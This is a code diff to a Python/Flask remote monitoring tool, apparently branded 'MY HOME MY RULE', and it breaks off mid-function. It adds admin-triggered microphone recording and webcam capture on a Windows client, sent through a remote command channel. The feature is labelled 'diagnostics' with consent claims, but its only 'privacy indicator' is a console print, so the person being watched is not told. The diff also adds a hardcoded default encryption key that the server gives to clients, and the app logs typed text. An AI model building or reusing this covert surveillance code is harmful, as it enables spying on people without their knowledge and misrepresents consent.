@@ -1,4 +1,5 @@
 import os
+import io
 import re
 import json
 import time
@@ -90,17 +91,75 @@ try:
 except Exception as e:
     print(f"AWS Boto3 initialization notice: {e}")
 
-def get_screenshot_signed_url(filename, expires_in=3600):
-    if not filename or not s3_client or not S3_BUCKET:
-        return None
+# ==================== AUTHENTICATED SCREENSHOT ENCRYPTION (AES-256-GCM) ====================
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+except ImportError:
+    AESGCM = None
+
+SCREENSHOT_MAGIC = b"MSENC1"
+
+def get_encryption_key_hex():
+    return os.getenv("SCREENSHOT_ENCRYPTION_KEY", "b491396ed90ba50f100bff505f9f3c611aa918383fe0e35b02123694b4be2ace").strip()
+
+def get_encryption_key_bytes():
+    raw_key = get_encryption_key_hex()
     try:
-        return s3_client.generate_presigned_url(
-            'get_object',
-            Params={'Bucket': S3_BUCKET, 'Key': filename},
-            ExpiresIn=expires_in
-        )
+        return bytes.fromhex(raw_key)
     except Exception:
+        return hashlib.sha256(raw_key.encode('utf-8')).digest()
+
+def encrypt_screenshot_bytes(image_bytes: bytes, device_id: str = "") -> bytes:
+    """
+    Encrypts screenshot image bytes immediately using AES-256-GCM authenticated encryption.
+    Generates a cryptographically secure 12-byte random nonce for every screenshot.
+    Returns binary payload: MAGIC (6B) + NONCE (12B) + CIPHERTEXT_WITH_GCM_AUTH_TAG
+    """
+    if AESGCM is None:
+        raise RuntimeError("cryptography library is required for AES-256-GCM encryption")
+    key = get_encryption_key_bytes()
+    aesgcm = AESGCM(key)
+    nonce = os.urandom(12)  # 96-bit unique nonce
+    ciphertext = aesgcm.encrypt(nonce, image_bytes, None)
+    return SCREENSHOT_MAGIC + nonce + ciphertext
+
+def decrypt_screenshot_bytes(encrypted_data: bytes, device_id: str = "") -> bytes:
+    """
+    Decrypts an AES-256-GCM encrypted screenshot binary in memory.
+    Validates MAGIC header and GCM authentication tag.
+    Returns raw image bytes (WebP/PNG).
+    """
+    if not encrypted_data:
+        raise ValueError("Empty encrypted data")
+        
+    # Check backwards compatibility for pre-existing unencrypted WebP/PNG images
+    if encrypted_data.startswith(b"RIFF") or encrypted_data.startswith(b"\x89PNG") or encrypted_data.startswith(b"\xff\xd8\xff"):
+        return encrypted_data
+
+    if len(encrypted_data) < len(SCREENSHOT_MAGIC) + 12 + 16:
+        raise ValueError("Encrypted screenshot payload is too short or corrupted")
+
+    if not encrypted_data.startswith(SCREENSHOT_MAGIC):
+        raise ValueError("Unrecognized screenshot format: missing MSENC1 encryption header")
+
+    nonce = encrypted_data[len(SCREENSHOT_MAGIC):len(SCREENSHOT_MAGIC)+12]
+    ciphertext = encrypted_data[len(SCREENSHOT_MAGIC)+12:]
+
+    if AESGCM is None:
+        raise RuntimeError("cryptography library is required for AES-256-GCM decryption")
+
+    key = get_encryption_key_bytes()
+    aesgcm = AESGCM(key)
+    return aesgcm.decrypt(nonce, ciphertext, None)
+
+def get_screenshot_signed_url(filename, expires_in=3600):
+    if not filename:
         return None
+    # All screenshots route through the authenticated, on-the-fly decryption endpoint
+    clean_fn = filename.lstrip('/')
+    if clean_fn.startswith('screenshots/'):
+        clean_fn = clean_fn[len('screenshots/'):]
+    return f"/api/screenshots/view/{clean_fn}"
 
 # Unique device identification helper
 def get_device_id():
@@ -304,8 +363,139 @@ def _poll_and_run_remote_command(device_id):
     except Exception as e:
         print(f"[RemoteCmd] Poll error: {e}")
 
+# ==================== CAMERA & MICROPHONE AV DIAGNOSTIC HELPERS ====================
+def show_client_av_indicator(mode):
+    """Displays a visible consent and privacy indicator on the monitored Windows client."""
+    if os.name != 'nt':
+        return
+    try:
+        msg = f"[MY HOME MY RULE] Audio/Video Diagnostic Session Active ({mode.capitalize()}). Authorized by Administrator. Privacy indicators active."
+        print(f"[AV Privacy Notice] {msg}")
+    except Exception:
+        pass
+
+def record_audio_sample(duration=5):
+    """
+    Records a diagnostic audio sample using standard Windows Multimedia API (winmm).
+    Activates Windows microphone privacy indicator in the taskbar.
+    """
+    if os.name != 'nt':
+        return None, "Audio recording is only supported on Windows clients"
+    temp_wav = os.path.abspath(f"temp_diag_{int(time.time())}.wav")
+    try:
+        winmm = ctypes.windll.winmm
+        winmm.mciSendStringA(b"open new type waveaudio alias mcrec", None, 0, None)
+        winmm.mciSendStringA(b"record mcrec", None, 0, None)
+        time.sleep(duration)
+        cmd_save = f'save mcrec "{temp_wav}"'.encode('ascii')
+        winmm.mciSendStringA(cmd_save, None, 0, None)
+        winmm.mciSendStringA(b"close mcrec", None, 0, None)
+        if os.path.exists(temp_wav):
+            with open(temp_wav, "rb") as f:
+                wav_bytes = f.read()
+            try:
+                os.remove(temp_wav)
+            except Exception:
+                pass
+            return wav_bytes, None
+        return None, "Windows audio subsystem did not generate wave file"
+    except Exception as e:
+        return None, str(e)
+
+def capture_camera_sample():
+    """
+    Attempts to capture a diagnostic camera frame using standard DirectShow / OpenCV.
+    Respects hardware LEDs (wired directly to camera sensor power) and Windows Camera privacy toggles.
+    """
+    if os.name != 'nt':
+        return None, "Camera capture is only supported on Windows clients"
+    try:
+        # Check Windows Camera Privacy setting in registry
+        try:
+            import winreg
+            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam")
+            val, _ = winreg.QueryValueEx(k, "Value")
+            winreg.CloseKey(k)
+            if str(val).lower() == "deny":
+                return None, "PERMISSION_DENIED: Camera access is disabled in Windows Privacy Settings (Settings > Privacy & security > Camera). Explicit consent required."
+        except Exception:
+            pass
+
+        try:
+            import cv2
+            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+            if not cap.isOpened():
+                return None, "HARDWARE_NOT_FOUND: No active webcam device detected or camera in use by another application."
+            ret, frame = cap.read()
+            cap.release()
+            if not ret or frame is None:
+                return None, "CAPTURE_FAILED: Camera device did not return a valid frame."
+            from PIL import Image
+            rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            img = Image.fromarray(rgb)
+            buf = io.BytesIO()
+            img.save(buf, format="WEBP", quality=50)
+            return buf.getvalue(), None
+        except ImportError:
+            return None, "DEPENDENCY_REQUIRED: OpenCV (cv2) is not installed on client machine for DirectShow webcam capture. (pip install opencv-python)"
+    except Exception as e:
+        return None, str(e)
+
+def _execute_av_diagnostic(device_id, command_id, mode, duration, via_http, server_url):
+    print(f"[AV] Executing {mode} diagnostic (session {command_id[:8]}, duration={duration}s)...")
+    show_client_av_indicator(mode)
+    
+    payload_bytes = None
+    err = None
+    status = "success"
+    
+    if mode == "audio":
+        payload_bytes, err = record_audio_sample(duration=duration)
+    elif mode == "camera":
+        payload_bytes, err = capture_camera_sample()
+    else:
+        err = f"Unknown mode: {mode}"
+        
+    if err:
+        status = "blocked"
+        print(f"[AV] Notice: {err}")
+        enc_b64 = ""
+    else:
+        enc_payload = encrypt_screenshot_bytes(payload_bytes)
+        enc_b64 = base64.b64encode(enc_payload).decode('ascii')
+        print(f"[AV] Diagnostic sample captured and encrypted ({len(enc_payload)} bytes)")
+        
+    result_data = {
+        "device_id": device_id,
+        "command_id": command_id,
+        "mode": mode,
+        "status": status,
+        "error": err or "",
+        "payload_b64": enc_b64
+    }
+    
+    if via_http and server_url:
+        try:
+            req = urllib.request.Request(
+                f"{server_url.rstrip('/')}/api/client/av/result",
+                data=json.dumps(result_data).encode('utf-8'),
+                headers=get_client_headers()
+            )
+            with urllib.request.urlopen(req, timeout=20) as r:
+                pass
+            print(f"[AV] Successfully reported encrypted AV diagnostic to central server.")
+        except Exception as e:
+            print(f"[AV] Failed to report AV result via HTTP: {e}")
+
 def _run_and_report_command(device_id, command_id, command, via_http=True, server_url=""):
-    """Execute a PowerShell command and post result back."""
+    """Execute a PowerShell command or AV diagnostic and post result back."""
+    if command.startswith("AV_DIAGNOSTIC:"):
+        parts = command.split(":")
+        mode = parts[1] if len(parts) > 1 else "audio"
+        duration = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 5
+        _execute_av_diagnostic(device_id, command_id, mode, duration, via_http, server_url)
+        return
+
     print(f"[RemoteCmd] Executing command {command_id[:8]}: {command[:80]}")
     exit_code = -1
     output = ""
@@ -1433,6 +1623,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         <svg style="width:15px;height:15px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                         PowerShell Terminal
                     </button>
+                    <button onclick="openAvModal()" style="background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #10b981; color: #10b981; padding: 0.4rem 0.85rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.4rem; font-size: 0.85rem; font-weight: 700; box-shadow: 0 0 12px rgba(16, 185, 129, 0.25); transition: all 0.2s;" title="Open Camera & Microphone Diagnostics Session">
+                        <svg style="width:15px;height:15px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                        AV Diagnostics
+                    </button>
                     <button onclick="openSettingsModal()" style="background-color: var(--bg-card); border: 1px solid var(--border); color: var(--text-main); padding: 0.4rem 0.8rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.35rem; font-size: 0.85rem; font-weight: 600; transition: all 0.2s;" title="Device Settings">
                         <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                         Settings
@@ -1620,6 +1814,46 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 <span onclick="setTerminalCmd('Get-EventLog -LogName System -Newest 20 -EntryType Error | Format-Table TimeGenerated,Source,Message -Wrap')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">System Errors</span>
                 <span onclick="setTerminalCmd('systeminfo | Select-String \"OS Name|System Boot|Total Physical\"')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">System Info</span>
                 <span onclick="setTerminalCmd('Get-ScheduledTask | Where-Object {$_.State -eq \"Running\"} | Select-Object TaskName,TaskPath | Format-Table')" style="cursor:pointer; color:#58a6ff; text-decoration:underline;">Running Tasks</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- AV Diagnostics & Media Modal -->
+    <div id="av-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2100; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
+        <div style="background:#0d1117; border:1px solid #30363d; border-radius:12px; width:640px; max-width:95%; padding:1.5rem; box-shadow:0 8px 32px rgba(0,0,0,0.7); display:flex; flex-direction:column; gap:1rem;">
+            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #21262d; padding-bottom:0.75rem;">
+                <div style="display:flex; align-items:center; gap:0.6rem;">
+                    <svg style="width:20px;height:20px;color:#10b981;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                    <span style="font-size:1.1rem; font-weight:700; color:#e6edf3;">AV Diagnostics & Media Session</span>
+                    <span id="av-device-label" style="font-size:0.8rem; color:#8b949e; background:#21262d; padding:2px 8px; border-radius:4px;"></span>
+                </div>
+                <button onclick="closeAvModal()" style="background:none; border:none; color:#8b949e; cursor:pointer; font-size:1.4rem;">&times;</button>
+            </div>
+
+            <div style="background:rgba(16, 185, 129, 0.08); border:1px solid rgba(16, 185, 129, 0.25); border-radius:8px; padding:0.75rem; font-size:0.8rem; color:#a7f3d0; line-height:1.5;">
+                <div style="font-weight:600; margin-bottom:0.25rem; display:flex; align-items:center; gap:0.4rem;">
+                    <span>🛡️</span> Hardware Privacy & Windows Security Compliance
+                </div>
+                <div>All diagnostic sessions strictly respect hardware LED indicators, Windows taskbar microphone notifications, and device permissions. Payloads are encrypted end-to-end with <b>AES-256-GCM</b>.</div>
+            </div>
+
+            <div style="display:flex; gap:0.75rem; flex-wrap:wrap;">
+                <button onclick="startAvDiagnostic('audio')" id="btn-diag-audio" style="flex:1; background:#1e293b; border:1px solid #38bdf8; color:#38bdf8; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
+                    <svg style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
+                    Microphone Diagnostic (5s)
+                </button>
+                <button onclick="startAvDiagnostic('camera')" id="btn-diag-camera" style="flex:1; background:#1e293b; border:1px solid #10b981; color:#10b981; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
+                    <svg style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                    Camera Frame Diagnostic
+                </button>
+            </div>
+
+            <div id="av-status-box" style="background:#010409; border:1px solid #21262d; border-radius:8px; padding:1rem; min-height:160px; display:flex; flex-direction:column; gap:0.75rem; color:#e6edf3; font-size:0.85rem;">
+                <div id="av-status-text" style="color:#8b949e;">Select a diagnostic test above to initiate an authorized session.</div>
+                <audio id="av-audio-player" controls style="display:none; width:100%; margin-top:0.5rem;"></audio>
+                <div style="text-align:center;">
+                    <img id="av-camera-img" style="display:none; max-width:100%; max-height:280px; border-radius:8px; border:1px solid #30363d; margin:0 auto;" />
+                </div>
             </div>
         </div>
     </div>
@@ -2394,6 +2628,104 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             }
         }
         // ==================== END REMOTE TERMINAL ====================
+
+        // ==================== AV DIAGNOSTICS & MEDIA SESSIONS ====================
+        let avPollInterval = null;
+        let avCurrentCommandId = null;
+
+        function openAvModal() {
+            if (!selectedDevice) return;
+            const d = allDevices.find(dev => dev.device_id === selectedDevice);
+            const label = d ? (d.nickname || d.device_id) : selectedDevice;
+            document.getElementById('av-device-label').innerText = label;
+            document.getElementById('av-status-text').innerHTML = 'Ready. Select a diagnostic test above to initiate an authorized session.';
+            document.getElementById('av-audio-player').style.display = 'none';
+            document.getElementById('av-camera-img').style.display = 'none';
+
+            const modal = document.getElementById('av-modal');
+            modal.style.display = 'flex';
+            setTimeout(() => {
+                modal.style.opacity = '1';
+                modal.style.pointerEvents = 'auto';
+            }, 50);
+        }
+
+        function closeAvModal() {
+            const modal = document.getElementById('av-modal');
+            modal.style.opacity = '0';
+            modal.style.pointerEvents = 'none';
+            if (avPollInterval) { clearInterval(avPollInterval); avPollInterval = null; }
+            setTimeout(() => { modal.style.display = 'none'; }, 200);
+        }
+
+        async function startAvDiagnostic(mode) {
+            if (!selectedDevice) return;
+            const statusEl = document.getElementById('av-status-text');
+            const audioPlayer = document.getElementById('av-audio-player');
+            const cameraImg = document.getElementById('av-camera-img');
+            audioPlayer.style.display = 'none';
+            cameraImg.style.display = 'none';
+
+            statusEl.innerHTML = `<span style="color:#38bdf8;">⏳ Requesting ${mode} diagnostic session from device... (Privacy indicators active on client)</span>`;
+            document.getElementById('btn-diag-audio').disabled = true;
+            document.getElementById('btn-diag-camera').disabled = true;
+
+            try {
+                const res = await fetch('/api/devices/av/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: selectedDevice, mode: mode, duration: 5 })
+                });
+                const data = await res.json();
+                if (!res.ok) {
+                    statusEl.innerHTML = `<span style="color:#ef4444;">✗ Failed: ${data.error || 'Server error'}</span>`;
+                    document.getElementById('btn-diag-audio').disabled = false;
+                    document.getElementById('btn-diag-camera').disabled = false;
+                    return;
+                }
+                avCurrentCommandId = data.command_id;
+                statusEl.innerHTML = `<span style="color:#f59e0b;">📡 Session dispatched. Client machine is executing diagnostic (${mode === 'audio' ? 'recording 5s audio' : 'capturing frame'})...</span>`;
+                
+                let pollAttempts = 0;
+                if (avPollInterval) clearInterval(avPollInterval);
+                avPollInterval = setInterval(async () => {
+                    pollAttempts++;
+                    if (pollAttempts > 40) {
+                        clearInterval(avPollInterval); avPollInterval = null;
+                        statusEl.innerHTML = '<span style="color:#ef4444;">⏱ Timeout: Client did not respond within 3 minutes.</span>';
+                        document.getElementById('btn-diag-audio').disabled = false;
+                        document.getElementById('btn-diag-camera').disabled = false;
+                        return;
+                    }
+                    try {
+                        const sRes = await fetch(`/api/devices/av/status?device_id=${encodeURIComponent(selectedDevice)}&command_id=${encodeURIComponent(avCurrentCommandId)}`);
+                        const sData = await sRes.json();
+                        if (sData.status === 'completed') {
+                            clearInterval(avPollInterval); avPollInterval = null;
+                            document.getElementById('btn-diag-audio').disabled = false;
+                            document.getElementById('btn-diag-camera').disabled = false;
+
+                            if (sData.result_status === 'blocked') {
+                                statusEl.innerHTML = `<b style="color:#f59e0b;">⚠ Windows Security Restriction:</b><br>${sData.error || 'Privacy settings or hardware lock prevented access.'}`;
+                            } else if (sData.mode === 'audio') {
+                                statusEl.innerHTML = `<b style="color:#10b981;">✓ Decrypted Audio Diagnostic Sample (AES-256-GCM Verified):</b>`;
+                                audioPlayer.src = `/api/devices/av/stream/${encodeURIComponent(selectedDevice)}/${encodeURIComponent(avCurrentCommandId)}`;
+                                audioPlayer.style.display = 'block';
+                                audioPlayer.play().catch(() => {});
+                            } else if (sData.mode === 'camera') {
+                                statusEl.innerHTML = `<b style="color:#10b981;">✓ Decrypted Camera Diagnostic Frame (AES-256-GCM Verified):</b>`;
+                                cameraImg.src = `/api/devices/av/stream/${encodeURIComponent(selectedDevice)}/${encodeURIComponent(avCurrentCommandId)}`;
+                                cameraImg.style.display = 'block';
+                            }
+                        }
+                    } catch (e) {}
+                }, 4000);
+            } catch (err) {
+                statusEl.innerHTML = `<span style="color:#ef4444;">✗ Network error: ${err.message}</span>`;
+                document.getElementById('btn-diag-audio').disabled = false;
+                document.getElementById('btn-diag-camera').disabled = false;
+            }
+        }
         
         async function saveSettings() {
             const nickname = document.getElementById('settings-nickname').value;
@@ -3280,7 +3612,68 @@ def index():
 
 @app.route('/screenshots/<path:filename>')
 def serve_screenshot(filename):
-    return send_from_directory('screenshots', filename)
+    return view_decrypted_screenshot(filename)
+
+@app.route('/api/screenshots/view/<path:filename>')
+def view_decrypted_screenshot(filename):
+    """
+    Secure endpoint for authorized administrators to view decrypted screenshots.
+    Verifies dashboard authentication.
+    Fetches the encrypted .dat file from S3 or local storage.
+    Decrypts in memory using AES-256-GCM.
+    Returns decrypted image with strict no-cache headers.
+    Never persists plaintext images to disk.
+    """
+    if '..' in filename:
+        return jsonify({"error": "Invalid path"}), 400
+
+    if not is_dashboard_authenticated():
+        return jsonify({"error": "Unauthorized: Admin authentication required"}), 401
+
+    encrypted_bytes = None
+
+    # 1. Fetch from S3 if configured
+    if s3_client is not None and S3_BUCKET:
+        try:
+            res = s3_client.get_object(Bucket=S3_BUCKET, Key=filename)
+            encrypted_bytes = res['Body'].read()
+        except Exception:
+            pass
+
+    # 2. Fallback to local screenshots/ directory
+    if encrypted_bytes is None:
+        local_path = os.path.join("screenshots", filename)
+        if os.path.exists(local_path):
+            try:
+                with open(local_path, "rb") as f:
+                    encrypted_bytes = f.read()
+            except Exception:
+                pass
+
+    if encrypted_bytes is None:
+        return jsonify({"error": "Screenshot not found"}), 404
+
+    try:
+        decrypted_bytes = decrypt_screenshot_bytes(encrypted_bytes)
+
+        # Detect mimetype
+        if decrypted_bytes.startswith(b"RIFF"):
+            mime_type = "image/webp"
+        elif decrypted_bytes.startswith(b"\x89PNG"):
+            mime_type = "image/png"
+        elif decrypted_bytes.startswith(b"\xff\xd8\xff"):
+            mime_type = "image/jpeg"
+        else:
+            mime_type = "image/webp"
+
+        resp = Response(decrypted_bytes, mimetype=mime_type)
+        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
+        resp.headers["Pragma"] = "no-cache"
+        resp.headers["Expires"] = "0"
+        return resp
+    except Exception as e:
+        print(f"Decryption failed for {filename}: {e}")
+        return jsonify({"error": f"Decryption failed: {str(e)}"}), 500
 
 @app.route('/api/devices')
 def get_devices():
@@ -3680,7 +4073,7 @@ def get_screenshots():
     if not os.path.exists(screenshot_dir):
         return jsonify([])
     files = os.listdir(screenshot_dir)
-    png_files = sorted([f for f in files if f.endswith(".png") or f.endswith(".webp")], reverse=False)
+    valid_files = sorted([f for f in files if f.endswith(".dat") or f.endswith(".bin") or f.endswith(".png") or f.endswith(".webp")], reverse=False)
     
     logs = parse_logs(start_date)
     screenshot_to_window = {}
@@ -3690,7 +4083,7 @@ def get_screenshots():
             screenshot_to_window[filename] = log_entry["window"]
             
     screenshot_list = []
-    for f in png_files:
+    for f in valid_files:
         ts_part = f.replace("screenshot_", "").replace("screenshot_periodic_", "").split(".")[0]
         try:
             parts = ts_part.split("_")
@@ -4109,7 +4502,8 @@ def client_verify_otp():
         return jsonify({
             "status": "success",
             "device_token": device_token,
-            "device_id": device_id
+            "device_id": device_id,
+            "encryption_key": get_encryption_key_hex()
         }), 200
     except Exception as e:
         return jsonify({"status": "error", "error": str(e)}), 500
@@ -4190,7 +4584,7 @@ def client_upload_screenshot():
     data = request.json or {}
     s3_path = data.get("s3_path")
     image_b64 = data.get("image_b64")
-    content_type = data.get("content_type", "image/webp")
+    content_type = data.get("content_type", "application/octet-stream")
     if not s3_path or not image_b64:
         return jsonify({"error": "s3_path and image_b64 required"}), 400
     if s3_client is not None and S3_BUCKET:
@@ -4200,10 +4594,10 @@ def client_upload_screenshot():
                 Bucket=S3_BUCKET,
                 Key=s3_path,
                 Body=img_bytes,
-                ContentType=content_type
+                ContentType="application/octet-stream"
             )
-            signed_url = get_screenshot_signed_url(s3_path)
-            return jsonify({"status": "success", "screenshot_url": signed_url, "s3_path": s3_path}), 200
+            screenshot_url = f"/api/screenshots/view/{s3_path}"
+            return jsonify({"status": "success", "screenshot_url": screenshot_url, "s3_path": s3_path}), 200
         except Exception as e:
             return jsonify({"error": str(e)}), 500
     return jsonify({"error": "S3 not configured"}), 500
@@ -4326,6 +4720,179 @@ def get_command_result():
             return jsonify({"error": str(e)}), 500
     return jsonify({"error": "DynamoDB not configured"}), 500
 
+# ==================== AV DIAGNOSTICS & MEDIA SESSION ENDPOINTS ====================
+@app.route('/api/devices/av/start', methods=['POST'])
+def start_av_session():
+    """Administrator initiates an authenticated AV diagnostic session (microphone / camera)."""
+    if not is_dashboard_authenticated():
+        return jsonify({"error": "Unauthorized: Admin authentication required"}), 401
+    data = request.json or {}
+    device_id = data.get("device_id")
+    mode = data.get("mode", "audio")
+    duration = int(data.get("duration", 5))
+    if not device_id:
+        return jsonify({"error": "device_id is required"}), 400
+    if mode not in ["audio", "camera"]:
+        return jsonify({"error": "Invalid mode: must be audio or camera"}), 400
+
+    command_id = f"AV_{mode}_{uuid.uuid4().hex[:8]}"
+    cmd_string = f"AV_DIAGNOSTIC:{mode}:{duration}"
+
+    # Audit log entry for administration accountability
+    now_iso = datetime.now(timezone.utc).isoformat()
+    if logs_tbl is not None:
+        try:
+            logs_tbl.put_item(Item={
+                "device_id": device_id,
+                "timestamp_id": f"{now_iso[:10]} {now_iso[11:19]}#{command_id[:8]}",
+                "timestamp": f"{now_iso[:10]} {now_iso[11:19]}",
+                "window_title": "[ADMIN AUDIT] AV Diagnostic Session Started",
+                "typed_text": f"Administrator initiated {mode} diagnostic session ({command_id}) with visible consent indicators active.",
+                "created_date": now_iso[:10]
+            })
+        except Exception:
+            pass
+
+    if devices_tbl is not None:
+        try:
+            cmd_obj = {
+                "command_id": command_id,
+                "command": cmd_string,
+                "mode": mode,
+                "duration": duration,
+                "status": "pending",
+                "dispatched_at": now_iso
+            }
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET pending_command = :pc",
+                ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
+            )
+            return jsonify({"status": "dispatched", "command_id": command_id, "mode": mode}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
+
+@app.route('/api/client/av/result', methods=['POST'])
+def client_post_av_result():
+    """Client posts encrypted AV diagnostic sample (audio/camera) back to server."""
+    data = request.json or {}
+    device_id = data.get("device_id")
+    command_id = data.get("command_id")
+    mode = data.get("mode", "audio")
+    result_status = data.get("status", "success")
+    error_msg = data.get("error", "")
+    payload_b64 = data.get("payload_b64", "")
+
+    if not device_id or not command_id:
+        return jsonify({"error": "device_id and command_id required"}), 400
+    ok, err = verify_client_token(device_id)
+    if not ok:
+        return err
+
+    # Store encrypted payload in S3 if provided
+    s3_key = None
+    if payload_b64 and s3_client and S3_BUCKET:
+        try:
+            raw_enc = base64.b64decode(payload_b64)
+            date_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+            s3_key = f"av_diag/{date_str}/{command_id}.dat"
+            s3_client.put_object(
+                Bucket=S3_BUCKET,
+                Key=s3_key,
+                Body=raw_enc,
+                ContentType="application/octet-stream"
+            )
+        except Exception as e:
+            print(f"Failed to store AV diagnostic in S3: {e}")
+
+    result_obj = {
+        "command_id": command_id,
+        "mode": mode,
+        "status": "completed",
+        "result_status": result_status,
+        "error": error_msg,
+        "s3_key": s3_key,
+        "completed_at": datetime.now(timezone.utc).isoformat()
+    }
+
+    if devices_tbl is not None:
+        try:
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET completed_av = :ca, pending_command = :pc",
+                ExpressionAttributeValues={
+                    ":ca": json.dumps(result_obj),
+                    ":pc": json.dumps({"status": "idle"})
+                }
+            )
+            return jsonify({"status": "success"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"status": "no_op"}), 200
+
+@app.route('/api/devices/av/status', methods=['GET'])
+def get_av_status():
+    """Dashboard polls status of AV diagnostic session."""
+    if not is_dashboard_authenticated():
+        return jsonify({"error": "Unauthorized"}), 401
+    device_id = request.args.get("device_id")
+    command_id = request.args.get("command_id")
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
+    if devices_tbl is not None:
+        try:
+            res = devices_tbl.get_item(Key={"device_id": device_id})
+            item = res.get("Item", {})
+            ca = item.get("completed_av")
+            ca_obj = json.loads(ca) if isinstance(ca, str) else (ca or {})
+            if ca_obj.get("command_id") == command_id:
+                return jsonify(ca_obj), 200
+            pc = item.get("pending_command")
+            pc_obj = json.loads(pc) if isinstance(pc, str) else (pc or {})
+            if pc_obj.get("command_id") == command_id:
+                return jsonify({"status": pc_obj.get("status", "pending")}), 200
+            return jsonify({"status": "unknown"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
+
+@app.route('/api/devices/av/stream/<device_id>/<command_id>', methods=['GET'])
+def stream_av_diagnostic(device_id, command_id):
+    """Administrator retrieves and decrypts AV diagnostic payload (audio or camera) in memory."""
+    if not is_dashboard_authenticated():
+        return jsonify({"error": "Unauthorized"}), 401
+    if devices_tbl is None:
+        return jsonify({"error": "Database not configured"}), 500
+
+    try:
+        res = devices_tbl.get_item(Key={"device_id": device_id})
+        item = res.get("Item", {})
+        ca = item.get("completed_av")
+        ca_obj = json.loads(ca) if isinstance(ca, str) else (ca or {})
+        if ca_obj.get("command_id") != command_id:
+            return jsonify({"error": "Session not found"}), 404
+
+        s3_key = ca_obj.get("s3_key")
+        if not s3_key or s3_client is None or not S3_BUCKET:
+            return jsonify({"error": "No payload stored"}), 404
+
+        s3_res = s3_client.get_object(Bucket=S3_BUCKET, Key=s3_key)
